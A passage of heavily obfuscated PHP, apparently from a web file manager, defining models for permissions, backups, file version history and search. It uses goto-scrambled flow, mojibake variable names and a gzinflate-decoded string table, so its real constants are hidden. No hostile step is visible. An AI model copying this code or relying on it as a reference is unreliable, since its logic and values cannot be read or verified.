parent::insert($d»½˜‰ö§); goto EÙÑ“Îš; cË¼¯¿¹ºØ: $cáŞ¶ê×¢Ô =& $_SERVER[‘®…¢À]; if ($this->findByName($d»½˜‰ö§[$cáŞ¶ê×¢Ô[28]])) { return !1; } $Cö”ÇÂØ“‹ = array($cáŞ¶ê×¢Ô[28] => $cáŞ¶ê×¢Ô[33], $cáŞ¶ê×¢Ô[372] => 1, $cáŞ¶ê×¢Ô[2018] => $cáŞ¶ê×¢Ô[2019], $cáŞ¶ê×¢Ô[2020] => 1, $cáŞ¶ê×¢Ô[1037] => 0, $cáŞ¶ê×¢Ô[2021] => 0); goto E´¡»”ª¯Ù; EÙÑ“Îš: } private function getSort() { $F¦Ì’ŞäÖÌ =& $_SERVER[‘®…¢À]; $Bóô––²¸ = parent::listData(); $eÍ­äîÏ†¤ = array_to_keyvalue($Bóô––²¸, $F¦Ì’ŞäÖÌ[33], $F¦Ì’ŞäÖÌ[2021]); return empty($eÍ­äîÏ†¤) ? 0 : max($eÍ­äîÏ†¤) + 1; } private function filterAuth(&$dÇ†âŒ–¯) { goto B‘ğø£Ğœõ; B‘ğø£Ğœõ: if (!$dÇ†âŒ–¯) { return; } $F—áóôÄàĞ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $D‚†æÇÏà = array(); goto Cöã°‘ÑË; Cöã°‘ÑË: foreach ($F—áóôÄàĞ as $f°“¦Áëå¬) { if ($dÇ†âŒ–¯ & $f°“¦Áëå¬) { $D‚†æÇÏà[] = $f°“¦Áëå¬; } } if (in_array(self::AUTH_ROOT, $D‚†æÇÏà)) { $dÇ†âŒ–¯ = array_sum($F—áóôÄàĞ); return; } $d„ÛŞáõãô = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Béßá£†ÏÇ; Béßá£†ÏÇ: foreach ($D‚†æÇÏà as $f°“¦Áëå¬) { if (isset($d„ÛŞáõãô[$f°“¦Áëå¬])) { $D‚†æÇÏà = array_merge($D‚†æÇÏà, $d„ÛŞáõãô[$f°“¦Áëå¬]); } } $D‚†æÇÏà[] = self::AUTH_SHOW; $dÇ†âŒ–¯ = array_sum(array_unique($D‚†æÇÏà)); goto Aæ‡åØÈ—ñ; Aæ‡åØÈ—ñ: } public function sort($d¿¼äç†çØ, $a‚šß°Âß) { return parent::update($d¿¼äç†çØ, $a‚šß°Âß); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x62\141\143\153\x75\x70\x4c\x69\163\164"; public $field = array("\x69\157", "\156\x61\x6d\145", "\x73\164\x61\164\x75\163", "\x63\157\156\x74\145\x6e\164", "\162\145\x73\165\154\x74", "\x74\151\x6d\145\106\162\x6f\x6d", "\164\151\155\145\124\157"); public function config() { goto AšÀÅ™İ¥’; b„‘ºÀ¾ŞÉ: if (isset($EÇ¼¸¸ÓŠ[$B‘¯¼÷ÒÜï[187]])) { $EÇ¼¸¸ÓŠ[$B‘¯¼÷ÒÜï[187]] = json_decode($EÇ¼¸¸ÓŠ[$B‘¯¼÷ÒÜï[187]], !0); } if (isset($bæˆõµ­®ƒ[$B‘¯¼÷ÒÜï[187]])) { $EÇ¼¸¸ÓŠ[$B‘¯¼÷ÒÜï[187]][$B‘¯¼÷ÒÜï[1312]] = $bæˆõµ­®ƒ[$B‘¯¼÷ÒÜï[187]]; unset($bæˆõµ­®ƒ[$B‘¯¼÷ÒÜï[187]]); } return array_merge($EÇ¼¸¸ÓŠ, $bæˆõµ­®ƒ); goto eªó’µÜ°Ç; eö¿›ÇÅ‘: $bæˆõµ­®ƒ = is_array($bæˆõµ­®ƒ) ? $bæˆõµ­®ƒ : array(); if (!isset($bæˆõµ­®ƒ[$B‘¯¼÷ÒÜï[665]])) { $bæˆõµ­®ƒ[$B‘¯¼÷ÒÜï[665]] = $B‘¯¼÷ÒÜï[463]; } $EÇ¼¸¸ÓŠ = array(); goto b™”Ú±ô£; AšÀÅ™İ¥’: $B‘¯¼÷ÒÜï =& $_SERVER[‘®…¢À]; $bæˆõµ­®ƒ = Model($B‘¯¼÷ÒÜï[1045])->get($B‘¯¼÷ÒÜï[684]); $bæˆõµ­®ƒ = json_decode($bæˆõµ­®ƒ, !0); goto eö¿›ÇÅ‘; b™”Ú±ô£: Action($B‘¯¼÷ÒÜï[2022])->taskInit(); $A×†¢ÑÃãÙ = Model($B‘¯¼÷ÒÜï[2023])->listData(); foreach ($A×†¢ÑÃãÙ as $D¿à’á–) { if ($D¿à’á–[$B‘¯¼÷ÒÜï[1037]] == $B‘¯¼÷ÒÜï[84] && $D¿à’á–[$B‘¯¼÷ÒÜï[1325]] == $B‘¯¼÷ÒÜï[2024]) { $EÇ¼¸¸ÓŠ = $D¿à’á–; break; } } goto b„‘ºÀ¾ŞÉ; eªó’µÜ°Ç: } public function listData($eƒŒ—››º‰ = false, $b¿ô·ÉŠ‘ç = "\x6d\157\x64\151\x66\x79\x54\x69\x6d\x65", $B¹¬¨ÈšÀ¡ = false) { return parent::listData($eƒŒ—››º‰, $b¿ô·ÉŠ‘ç, !0); } public function lastItem() { $FŸŸ§§ó¤÷ = $this->listData(); return !empty($FŸŸ§§ó¤÷[0]) ? $FŸŸ§§ó¤÷[0] : null; } public function kill($f‚ñ®­ö«ê) { goto dôŸ¹ç×®¢; C‘‚ë…©: $B¤™‡ß¥ = $c¹ºÖ–¡Æ[$f‡È³³âÇ[28]]; $e¨œ¡³éÍÙ = TEMP_FILES . $f‡È³³âÇ[691] . $B¤™‡ß¥ . $f‡È³³âÇ[8]; IO::remove($e¨œ¡³éÍÙ, !1); goto F¥Â›†½; dôŸ¹ç×®¢: $f‡È³³âÇ =& $_SERVER[‘®…¢À]; $c¹ºÖ–¡Æ = $this->listData($f‚ñ®­ö«ê); if (!$c¹ºÖ–¡Æ || empty($c¹ºÖ–¡Æ[$f‡È³³âÇ[28]])) { return !0; } goto b­Åö°¬; F¥Â›†½: return $this->remove($f‚ñ®­ö«ê); goto B†¿ ¿»‡†; b­Åö°¬: Task::kill($f‡È³³âÇ[683]); Task::kill($f‡È³³âÇ[713]); Task::kill($f‡È³³âÇ[720]); goto C‘‚ë…©; B†¿ ¿»‡†: } public function remove($a¦ÙóŞó) { $Eç´ áÂˆ = $this->listData($a¦ÙóŞó); if (!$Eç´ áÂˆ) { return !0; } return $this->backupRemove($Eç´ áÂˆ); } private function backupRemove($A‡‡µàÃÄã) { $d†¼ˆ¼“½  =& $_SERVER[‘®…¢À]; parent::remove($A‡‡µàÃÄã[$d†¼ˆ¼“½ [363]]); $a‰ªÙ¨é¤¯ = "\x7b\x69\157\72{$A‡‡µàÃÄã[$d†¼ˆ¼“½ [664]]}\x7d\x2f\x64\x61\164\141\142\141\163\x65\57" . $A‡‡µàÃÄã[$d†¼ˆ¼“½ [28]]; IO::remove($a‰ªÙ¨é¤¯, !1); return !0; } public function start() { goto dŠÜä¹è¼Ô; A©õÊˆ¢®: if (Hook::trigger($Aêò÷ëî˜Â[2025]) == $Aêò÷ëî˜Â[2026]) { return !0; } $eÏ·Â¶‚– = $this->process(); foreach ($eÏ·Â¶‚– as $E–Ä’ÕÄÂ) { if ($E–Ä’ÕÄÂ) { return Task::restart($E–Ä’ÕÄÂ[$Aêò÷ëî˜Â[363]]); } } goto Eß¨â—ÉÌœ; Eß¨â—ÉÌœ: $D†¡†„Ëè‘ = new Backup(); $D†¡†„Ëè‘->keep(); if (!$D†¡†„Ëè‘->db()) { return !1; } goto FÔŒô¹Éƒ; C–×³ëÅÀ: return !0; goto cåõöíÏš„; FÔŒô¹Éƒ: if (!$D†¡†„Ëè‘->dbFile()) { return !1; } if ($EÊ“Ä“À¬[$Aêò÷ëî˜Â[665]] == $Aêò÷ëî˜Â[463]) { $D†¡†„Ëè‘->file(); } Backup::set(array($Aêò÷ëî˜Â[662] => 1, $Aêò÷ëî˜Â[676] => time())); goto C–×³ëÅÀ; dŠÜä¹è¼Ô: $Aêò÷ëî˜Â =& $_SERVER[‘®…¢À]; $EÊ“Ä“À¬ = $this->config(); if (!$EÊ“Ä“À¬ || $EÊ“Ä“À¬[$Aêò÷ëî˜Â[1310]] != $Aêò÷ëî˜Â[84]) { return !1; } goto A©õÊˆ¢®; cåõöíÏš„: } public function process() { $eÄâÅ¬Ì…ö =& $_SERVER[‘®…¢À]; return array($eÄâÅ¬Ì…ö[667] => Task::get($eÄâÅ¬Ì…ö[683]), $eÄâÅ¬Ì…ö[670] => Task::get($eÄâÅ¬Ì…ö[713]), $eÄâÅ¬Ì…ö[164] => Task::get($eÄâÅ¬Ì…ö[720])); } public function restore() { $Fš¦‘Ï—öê =& $_SERVER[‘®…¢À]; ActionCall($Fš¦‘Ï—öê[2027], !0, 1); ActionCall($Fš¦‘Ï—öê[2027], !0, 0); } } goto dØÂ‘ê½“‘; b£¨ŒÛ”: $b™òÚË»„« = $_SERVER[‘®…¢À][538]; while ($b™òÚË»„« < $_SERVER[‘®…¢À][539]) { if ($b™òÚË»„« >= 0) { break; } $b™òÚË»„«++; } $_SERVER[Ş›] = explode($_SERVER[‘®…¢À][540], gzinflate(substr($_SERVER[‘®…¢À][541], 10, -8))); goto b¹¬†òãŠ; A·†¯¿ß­ä: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\143\145\137\150\x69\163\x74\157\x72\171"; public function addHistory($D› Ğ÷Å›Ï, $CÌ³ŞÕ“Ï† = '') { $cÉŠŒ†®ç =& $_SERVER[‘®…¢À]; $a×öÀîøˆ× = array($cÉŠŒ†®ç[379] => $D› Ğ÷Å›Ï[$cÉŠŒ†®ç[365]], $cÉŠŒ†®ç[1328] => isset($D› Ğ÷Å›Ï[$cÉŠŒ†®ç[375]]) ? $D› Ğ÷Å›Ï[$cÉŠŒ†®ç[375]] : $D› Ğ÷Å›Ï[$cÉŠŒ†®ç[374]], $cÉŠŒ†®ç[415] => $D› Ğ÷Å›Ï[$cÉŠŒ†®ç[414]], $cÉŠŒ†®ç[511] => $D› Ğ÷Å›Ï[$cÉŠŒ†®ç[78]], $cÉŠŒ†®ç[2184] => $CÌ³ŞÕ“Ï†); $eò°¨­µÑ = $GLOBALS[$cÉŠŒ†®ç[6]][$cÉŠŒ†®ç[85]][$cÉŠŒ†®ç[2185]]; if ($eò°¨­µÑ > 1) { $this->historyAutoClear($a×öÀîøˆ×[$cÉŠŒ†®ç[365]]); $this->add($a×öÀîøˆ×); } Model($cÉŠŒ†®ç[2186])->eventFileEdit($D› Ğ÷Å›Ï[$cÉŠŒ†®ç[365]]); } private function historyAutoClear($E¥åÌîãí) { goto eù˜œ½­ÅŠ; eù˜œ½­ÅŠ: $f‹±ÏÛ‰˜  =& $_SERVER[‘®…¢À]; $CŒØˆ‡´À = Model($f‹±ÏÛ‰˜ [1045])->get($f‹±ÏÛ‰˜ [2187]); $d‡İÖÖÜñí = $GLOBALS[$f‹±ÏÛ‰˜ [6]][$f‹±ÏÛ‰˜ [85]][$f‹±ÏÛ‰˜ [2185]]; goto a–‚ËˆÀàâ; fÕÂßÜŠÌ: $b¨Â‹¬İ‹“ = array($f‹±ÏÛ‰˜ [381] => array($f‹±ÏÛ‰˜ [7], $ešÒ¶‡åîª)); $this->where($b¨Â‹¬İ‹“)->delete(); Model($f‹±ÏÛ‰˜ [417])->remove($aå²¤ –ÁÈ); goto cğÕçñµÄ½; E™ù¿‰á: $aå²¤ –ÁÈ = array_to_keyvalue($fßÜŸ¶³‡–, $f‹±ÏÛ‰˜ [33], $f‹±ÏÛ‰˜ [414]); $aå²¤ –ÁÈ = array_slice($aå²¤ –ÁÈ, $f¡¦à°ë); if (!$ešÒ¶‡åîª || !$aå²¤ –ÁÈ) { return; } goto fÕÂßÜŠÌ; E½ºÇ¥ô†: if ($f¡¦à°ë >= 500) { return; } $b¨Â‹¬İ‹“ = array($f‹±ÏÛ‰˜ [379] => $E¥åÌîãí); $fßÜŸ¶³‡– = $this->field($f‹±ÏÛ‰˜ [2189])->where($b¨Â‹¬İ‹“)->order($f‹±ÏÛ‰˜ [2181])->select(); goto B½ùåÛæ„; B½ùåÛæ„: if (!$fßÜŸ¶³‡– || $f¡¦à°ë >= count($fßÜŸ¶³‡–)) { return; } $ešÒ¶‡åîª = array_to_keyvalue($fßÜŸ¶³‡–, $f‹±ÏÛ‰˜ [33], $f‹±ÏÛ‰˜ [363]); $ešÒ¶‡åîª = array_slice($ešÒ¶‡åîª, $f¡¦à°ë); goto E™ù¿‰á; a–‚ËˆÀàâ: $f‡Í¾Ö¸È™ = $CŒØˆ‡´À == $f‹±ÏÛ‰˜ [2188] ? 3 : $d‡İÖÖÜñí; if ($d‡İÖÖÜñí <= 1) { $f‡Í¾Ö¸È™ = 1; } $f¡¦à°ë = $f‡Í¾Ö¸È™ - 1; goto E½ºÇ¥ô†; cğÕçñµÄ½: } public function listData($a¼»ÊªËÅ) { goto B¢Ò¯’å‚İ; B¢Ò¯’å‚İ: $BÒéÖ‡®÷¦ =& $_SERVER[‘®…¢À]; $f¼¬µ Í¡Ä = array($BÒéÖ‡®÷¦[379] => $a¼»ÊªËÅ); $DŸ™À×îˆ™ = $BÒéÖ‡®÷¦[2190]; goto eÍ¼¯…¶É; a»Ş¦¸˜Üò: $BŞïù˜¿ƒ = 3; if ($D˜Ô‡íèëè == $BÒéÖ‡®÷¦[2188]) { $E”¢ÉìºÊè[$BÒéÖ‡®÷¦[350]] = array_slice($E”¢ÉìºÊè[$BÒéÖ‡®÷¦[350]], 0, $BŞïù˜¿ƒ); $E”¢ÉìºÊè[$BÒéÖ‡®÷¦[347]] = array($BÒéÖ‡®÷¦[2191] => 1, $BÒéÖ‡®÷¦[2192] => 20, $BÒéÖ‡®÷¦[2193] => 1, $BÒéÖ‡®÷¦[2194] => count($E”¢ÉìºÊè[$BÒéÖ‡®÷¦[350]])); } return $E”¢ÉìºÊè; goto B—¢¯³æ; eÍ¼¯…¶É: $E”¢ÉìºÊè = $this->field($DŸ™À×îˆ™)->where($f¼¬µ Í¡Ä)->order($BÒéÖ‡®÷¦[2181])->selectPage(); $this->_listAppendUser($E”¢ÉìºÊè[$BÒéÖ‡®÷¦[350]]); $D˜Ô‡íèëè = Model($BÒéÖ‡®÷¦[1045])->get($BÒéÖ‡®÷¦[2187]); goto a»Ş¦¸˜Üò; B—¢¯³æ: } protected function _listAppendUser(&$fºÃÄ’²¾×) { $CÕ¾ÎÛ–ï“ =& $_SERVER[‘®…¢À]; $d¶Á™‚ŸÂÛ = array_to_keyvalue($fºÃÄ’²¾×, $CÕ¾ÎÛ–ï“[33], $CÕ¾ÎÛ–ï“[1337]); $eèâêÓÊˆ¦ = Model($CÕ¾ÎÛ–ï“[468])->userListInfo($d¶Á™‚ŸÂÛ); foreach ($fºÃÄ’²¾× as &$C÷‘Ä…³•‡) { $e£ßÌÕ™‡‘ = $C÷‘Ä…³•‡[$CÕ¾ÎÛ–ï“[1337]]; $C÷‘Ä…³•‡[$CÕ¾ÎÛ–ï“[374]] = $eèâêÓÊˆ¦[$e£ßÌÕ™‡‘] ? $eèâêÓÊˆ¦[$e£ßÌÕ™‡‘] : !1; } } public function fileInfo($B¬ĞºÁ¿¥¶) { $CŠ£”·ˆ¥« =& $_SERVER[‘®…¢À]; $BÇ ¿³íä± = $this->tablePrefix; $a­®Š£Åö· = "{$BÇ ¿³íä±}\x69\x6f\x5f\146\x69\x6c\x65\40\x66\x69\154\x65\x73\x20\x6f\x6e\40\x66\x69\154\145\163\x2e\x66\x69\x6c\x65\x49\x44\40\x3d\40\x68\x69\163\x74\x6f\x72\171\56\x66\151\x6c\x65\111\x44"; return $this->alias($CŠ£”·ˆ¥«[2195])->where(array($CŠ£”·ˆ¥«[381] => $B¬ĞºÁ¿¥¶))->join($a­®Š£Åö·, $CŠ£”·ˆ¥«[2196])->find(); } public function removeItem($CÕëØò¬Í’) { $e¥‹ß¡à¾ =& $_SERVER[‘®…¢À]; $C’î°ôÕÌ = array($e¥‹ß¡à¾[381] => $CÕëØò¬Í’); $CêîŠ¬À« = $this->where($C’î°ôÕÌ)->find(); if ($CêîŠ¬À«) { $bïàùò¤¶© = $this->where($C’î°ôÕÌ)->delete(); Model($e¥‹ß¡à¾[417])->remove($CêîŠ¬À«[$e¥‹ß¡à¾[414]]); return $bïàùò¤¶©; } return !1; } public function removeBySource($FÔ£¿Ûº‚Œ) { goto FŠº ˜âÉ¹; d‚‰âÄŸÍ¿: $fàº—ö° = array($f‹Íô¶à«[379] => array($f‹Íô¶à«[7], $FÔ£¿Ûº‚Œ)); $cµÜ¢Óšä‘ = $this->field($f‹Íô¶à«[415])->where($fàº—ö°)->select(); if ($cµÜ¢Óšä‘) { $this->where($fàº—ö°)->delete(); $d¬¢Š¤´à = array_to_keyvalue($cµÜ¢Óšä‘, $f‹Íô¶à«[33], $f‹Íô¶à«[414]); Model($f‹Íô¶à«[417])->remove($d¬¢Š¤´à); } goto E…ÜîÈèÀñ; E…ÜîÈèÀñ: return !0; goto C½ÜµÓô‰; FŠº ˜âÉ¹: $f‹Íô¶à« =& $_SERVER[‘®…¢À]; if (!$FÔ£¿Ûº‚Œ) { return !1; } if (!is_array($FÔ£¿Ûº‚Œ)) { $FÔ£¿Ûº‚Œ = array($FÔ£¿Ûº‚Œ); } goto d‚‰âÄŸÍ¿; C½ÜµÓô‰: } public function setDetail($b·ÁäØŠì³, $eĞ‰”¡õœ) { $B¸Õ‚¹¶õ =& $_SERVER[‘®…¢À]; return $this->where(array($B¸Õ‚¹¶õ[381] => $b·ÁäØŠì³))->save(array($B¸Õ‚¹¶õ[2184] => $eĞ‰”¡õœ)); } public function rollbackToItem($Aµà‚¼ï¼, $dÇ³íâ´¸ˆ) { goto C­†¥µŒ’×; C­†¥µŒ’×: $b¥ŒĞ„±š™ =& $_SERVER[‘®…¢À]; $CÀØ×Û†Ü = Model($b¥ŒĞ„±š™[735])->sourceInfo($Aµà‚¼ï¼); $this->addHistory($CÀØ×Û†Ü); goto D¥†ÅÈ¤Ó‹; D¥†ÅÈ¤Ó‹: $a©ªñö·’¿ = $this->find($dÇ³íâ´¸ˆ); $C˜õÁó÷Îƒ = array($b¥ŒĞ„±š™[414] => $a©ªñö·’¿[$b¥ŒĞ„±š™[414]], $b¥ŒĞ„±š™[78] => $a©ªñö·’¿[$b¥ŒĞ„±š™[78]], $b¥ŒĞ„±š™[108] => time(), $b¥ŒĞ„±š™[375] => USER_ID); Model($b¥ŒĞ„±š™[735])->where(array($b¥ŒĞ„±š™[365] => $Aµà‚¼ï¼))->save($C˜õÁó÷Îƒ); goto fœ‘ååÛÌ¼; fœ‘ååÛÌ¼: return $this->where(array($b¥ŒĞ„±š™[381] => $dÇ³íâ´¸ˆ))->delete(); goto E²”¹†Ã¯; E²”¹†Ã¯: } public function clearSame($b–‘ÛÂ¸²î) { goto BÊÌ«ÅŒ„˜; b‡ÛğİğÁ: $Dîù·Ù¤Ï™ = array(); $BŠç‘íøÏ = array(); foreach ($Eˆ®Ó¡§‹ as $cÓ¿ª†¹õ¤) { if (count($cÓ¿ª†¹õ¤) <= 1) { continue; } foreach ($cÓ¿ª†¹õ¤ as $eË·åœóÄ) { $Dîù·Ù¤Ï™[] = $eË·åœóÄ[$B„ŒÌˆ¢È[414]]; $BŠç‘íøÏ[] = $eË·åœóÄ[$B„ŒÌˆ¢È[363]]; } } goto BÅìÁ¨Šäó; BÅìÁ¨Šäó: if (!$BŠç‘íøÏ) { return; } $this->where(array($B„ŒÌˆ¢È[363] => array($B„ŒÌˆ¢È[7], $BŠç‘íøÏ)))->delete(); Model($B„ŒÌˆ¢È[417])->remove($Dîù·Ù¤Ï™); goto E¬Ÿ „“; BÊÌ«ÅŒ„˜: $B„ŒÌˆ¢È =& $_SERVER[‘®…¢À]; $cï‰«Š˜¶‹ = $this->listData($b–‘ÛÂ¸²î); $Eˆ®Ó¡§‹ = array_to_keyvalue_group($cï‰«Š˜¶‹, $B„ŒÌˆ¢È[414]); goto b‡ÛğİğÁ; E¬Ÿ „“: } public function userSpace() { $F®¦õŒÙ¼… =& $_SERVER[‘®…¢À]; $aØâëˆÓƒë = $this->tablePrefix; $Cé–—‚ÈÜ¥ = array($F®¦õŒÙ¼…[1328] => USER_ID); $E‘Ò‰ï¯é = "{$aØâëˆÓƒë}\151\x6f\x5f\x66\x69\x6c\x65\x20\146\x69\154\x65\163\40\x6f\x6e\x20\x66\151\x6c\145\x73\56\x66\151\154\145\111\104\40\75\x20\150\151\x73\164\x6f\162\171\56\146\151\x6c\145\x49\104"; return $this->alias($F®¦õŒÙ¼…[2195])->where($Cé–—‚ÈÜ¥)->join($E‘Ò‰ï¯é, $F®¦õŒÙ¼…[2196])->sum($F®¦õŒÙ¼…[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E«ªŠ›èÖÊ) { goto Dœß¹Æ¦ÈØ; BŠš°íˆ“: if (!$DÅîŠ•…âµ[$C¤İàëîø©[157]]) { $cªÌºöî½á = array_to_keyvalue($bÒôåÙ©ôå, $C¤İàëîø©[33], $C¤İàëîø©[157]); $cŒøƒ¾îß = implode($C¤İàëîø©[47], $cªÌºöî½á); $AÊµÈˆ‘Š = $C¤İàëîø©[2153]; } $bñÊ±Ò•İÛ = explode($C¤İàëîø©[47], trim($cŒøƒ¾îß, $C¤İàëîø©[47])); return array($AÊµÈˆ‘Š, $bñÊ±Ò•İÛ); goto eĞŸ¨“…»Ü; Dœß¹Æ¦ÈØ: $C¤İàëîø© =& $_SERVER[‘®…¢À]; $bÒôåÙ©ôå = KodIO::fileTypeList(); $DÅîŠ•…âµ = $bÒôåÙ©ôå[$E«ªŠ›èÖÊ]; goto a¯ó·¸Ñ¸; a¯ó·¸Ñ¸: if (!$DÅîŠ•…âµ) { return array(); } $cŒøƒ¾îß = $DÅîŠ•…âµ[$C¤İàëîø©[157]]; $AÊµÈˆ‘Š = $C¤İàëîø©[7]; goto BŠš°íˆ“; eĞŸ¨“…»Ü: } public function listPathType($bÅÎ«Öµù£) { $f¼‡èîªù =& $_SERVER[‘®…¢À]; $Cª°™¯Ğ¾à = $this->fileTypeWhere($bÅÎ«Öµù£); if (!$Cª°™¯Ğ¾à) { return array(); } $fÛ¬„—Ø­— = array($f¼‡èîªù[512] => SourceModel::TYPE_USER, $f¼‡èîªù[513] => USER_ID, $f¼‡èîªù[509] => 0, $f¼‡èîªù[510] => $Cª°™¯Ğ¾à); return $this->listSource($fÛ¬„—Ø­—); } public function listSearch($Fº’š“ÜøÛ, $EšÈ¯ÁÁ = 300) { goto C®ª«³£; CÀ® èãå: $this->_listSearchBindPinyin($Fº’š“ÜøÛ, $B‚Í£¼·µ‰, $E‚ªÒï–Ì); $this->alias($AßÉÕ»¬¥ì[478])->_makeOrder()->cache(null, 10); $eÆ×õëÕŠÖ = $this->distinct(!0)->field($E‚ªÒï–Ì)->where($B‚Í£¼·µ‰)->selectPage($EšÈ¯ÁÁ); goto A­ğ»©£¾Ÿ; A­ğ»©£¾Ÿ: $this->_listSearchDesc($eÆ×õëÕŠÖ, $Fº’š“ÜøÛ, $aò—„¤Ò‹õ); $this->_listSearchTag($eÆ×õëÕŠÖ, $Fº’š“ÜøÛ, $aò—„¤Ò‹õ); $this->_listDataApply($eÆ×õëÕŠÖ[$AßÉÕ»¬¥ì[350]]); goto F‹ìøÕé; F‹ìøÕé: $this->_listMake($eÆ×õëÕŠÖ); return $eÆ×õëÕŠÖ; goto cñ—‚êõõŞ; E§Ê§èŞõ«: if (!isset($B‚Í£¼·µ‰[$AßÉÕ»¬¥ì[392]])) { $B‚Í£¼·µ‰[$AßÉÕ»¬¥ì[392]] = 0; } $E‚ªÒï–Ì = $AßÉÕ»¬¥ì[2198]; $aò—„¤Ò‹õ = $E‚ªÒï–Ì; goto CÀ® èãå; C®ª«³£: $AßÉÕ»¬¥ì =& $_SERVER[‘®…¢À]; if (isset($Fº’š“ÜøÛ[$AßÉÕ»¬¥ì[2078]]) && $Fº’š“ÜøÛ[$AßÉÕ»¬¥ì[2078]]) { $Fº’š“ÜøÛ[$AßÉÕ»¬¥ì[2078]] = str_replace($AßÉÕ»¬¥ì[1488], $AßÉÕ»¬¥ì[2197], trim($Fº’š“ÜøÛ[$AßÉÕ»¬¥ì[2078]])); } $B‚Í£¼·µ‰ = $this->_parseSearchWhere($Fº’š“ÜøÛ); goto E§Ê§èŞõ«; cñ—‚êõõŞ: } private function _listSearchTag(&$F×ÂšÄÁ¥Ñ, $Fæ‡ÌÌÔ„, $c¹˜Òß®‡¡) { goto c™´®øõÖø; dõò˜Õ¼: if (!$f¢”ÈŒñ·Ş) { return; } $A”å÷‡ÈÔ = array($FôÛÏ±¨à‡[389] => array($FôÛÏ±¨à‡[7], $f¢”ÈŒñ·Ş)); $DªÍ‡Ê¾šÀ = Model($FôÛÏ±¨à‡[2200])->field($FôÛÏ±¨à‡[76])->where($A”å÷‡ÈÔ)->select(); goto CßÔ¥…©‰Ã; BÎÓÊ‚†Ñ³: $f¢”ÈŒñ·Ş = array(); $A´í·Œ­‘± = $Fæ‡ÌÌÔ„[$FôÛÏ±¨à‡[2078]]; foreach ($Dò´ÓõõÕ as $FŠÏğµŞ›) { $c·è»†©ø— = $FŠÏğµŞ›[$FôÛÏ±¨à‡[28]]; $f¨‹°³ÛÖí = str_replace($FôÛÏ±¨à‡[50], $FôÛÏ±¨à‡[33], Pinyin::encode($c·è»†©ø—)); if (stripos($c·è»†©ø—, $A´í·Œ­‘±) !== !1 || stripos($f¨‹°³ÛÖí, $A´í·Œ­‘±) !== !1) { $f¢”ÈŒñ·Ş[] = $FŠÏğµŞ›[$FôÛÏ±¨à‡[363]]; } } goto dõò˜Õ¼; c™´®øõÖø: $FôÛÏ±¨à‡ =& $_SERVER[‘®…¢À]; if (!$Fæ‡ÌÌÔ„[$FôÛÏ±¨à‡[2078]] || $F×ÂšÄÁ¥Ñ[$FôÛÏ±¨à‡[347]][$FôÛÏ±¨à‡[336]] > 1) { return; } $Dò´ÓõõÕ = Model($FôÛÏ±¨à‡[2199])->listData(); goto BÎÓÊ‚†Ñ³; CßÔ¥…©‰Ã: $DªÍ‡Ê¾šÀ = array_to_keyvalue($DªÍ‡Ê¾šÀ, $FôÛÏ±¨à‡[33], $FôÛÏ±¨à‡[76]); $b— ªáñ’ = array_unique($DªÍ‡Ê¾šÀ); $this->_listSearchMerge($F×ÂšÄÁ¥Ñ, $Fæ‡ÌÌÔ„, $c¹˜Òß®‡¡, $b— ªáñ’); goto eŠŸ’ˆé‹ã; eŠŸ’ˆé‹ã: } private function _listSearchDesc(&$ešô¯ô„ÙÍ, $d¶óÙèÀ…, $B—óÕ¨¼å) { goto Aø‡Ç…®¬ˆ; EåÍ½‚‡Ï„: $a»Â¨ßš® = array_unique($a»Â¨ßš®); if (!$a»Â¨ßš®) { return; } $béµ‡¥ÕïÜ = array($B‰ĞÔëŒ†š[365] => array($B‰ĞÔëŒ†š[7], $a»Â¨ßš®), $B‰ĞÔëŒ†š[90] => $B‰ĞÔëŒ†š[400], $B‰ĞÔëŒ†š[355] => array($B‰ĞÔëŒ†š[734], $B‰ĞÔëŒ†š[2080] . $d¶óÙèÀ…[$B‰ĞÔëŒ†š[2078]] . $B‰ĞÔëŒ†š[2080])); goto e†—ô’‰×¸; e†—ô’‰×¸: $e–ã¥÷äƒ = Model($B‰ĞÔëŒ†š[495])->field($B‰ĞÔëŒ†š[365])->where($béµ‡¥ÕïÜ)->select(); $AíãÜÌëª = array_to_keyvalue($e–ã¥÷äƒ, $B‰ĞÔëŒ†š[33], $B‰ĞÔëŒ†š[365]); $this->_listSearchMerge($ešô¯ô„ÙÍ, $d¶óÙèÀ…, $B—óÕ¨¼å, $AíãÜÌëª); goto E°ìŒ¾—‚; Aø‡Ç…®¬ˆ: $B‰ĞÔëŒ†š =& $_SERVER[‘®…¢À]; if (!$d¶óÙèÀ…[$B‰ĞÔëŒ†š[2078]] || $ešô¯ô„ÙÍ[$B‰ĞÔëŒ†š[347]][$B‰ĞÔëŒ†š[336]] > 1) { return; } $a»Â¨ßš® = $this->listSearchChildren($d¶óÙèÀ…[$B‰ĞÔëŒ†š[456]]); goto EåÍ½‚‡Ï„; E°ìŒ¾—‚: } private function _listSearchMerge(&$b¶Â¢Şœ¢à, $EåƒÇåŸùå, $cäñ¥†©, $b¥Óñ˜—Şé) { goto fİ†Ûè‰à; fİ†Ûè‰à: $CŸï²ÎØÓ› =& $_SERVER[‘®…¢À]; if (!$b¥Óñ˜—Şé) { return; } $e¡Ÿ­Å¬Ã = array_to_keyvalue($b¶Â¢Şœ¢à[$CŸï²ÎØÓ›[350]], $CŸï²ÎØÓ›[33], $CŸï²ÎØÓ›[365]); goto D¤µ¯Œñ©; D¤µ¯Œñ©: $b±º‘óÈß— = array_diff($b¥Óñ˜—Şé, $e¡Ÿ­Å¬Ã); if (!$b±º‘óÈß—) { return; } $Cø™Ú…‚¨Ï = array($CŸï²ÎØÓ›[365] => array($CŸï²ÎØÓ›[7], $b±º‘óÈß—)); goto F‚¼æ®ÌÁ; fèí¤Ë¿¼: foreach ($BœÅì‡‚†¹ as $få¹ë‘”ñ) { $aÜê¹Ö¡°Ù = $CŸï²ÎØÓ›[47] . 